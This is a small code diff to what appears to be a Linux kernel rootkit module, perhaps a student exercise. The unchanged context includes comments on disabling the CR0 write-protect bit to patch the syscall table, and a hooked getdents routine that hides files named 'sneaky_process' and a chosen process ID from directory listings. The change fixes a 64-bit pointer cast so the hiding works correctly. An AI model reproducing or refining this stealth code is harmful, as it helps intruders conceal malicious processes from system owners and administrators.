@@ -9,7 +9,6 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
-
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -69,7 +68,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 		if ((strcmp(cur->d_name, "sneaky_process") == 0) || (strcmp(cur->d_name, sneaky_process_id) == 0)) {
 			int reclen = cur->d_reclen;
 			char *next_rec = (char *)cur + reclen;
-			int len = (int)dirp + rtn - (int)next_rec;
+			int len = (size_t)dirp + rtn - (size_t)next_rec;
 			memmove(cur, next_rec, len);
 			rtn -= reclen;
 			continue;
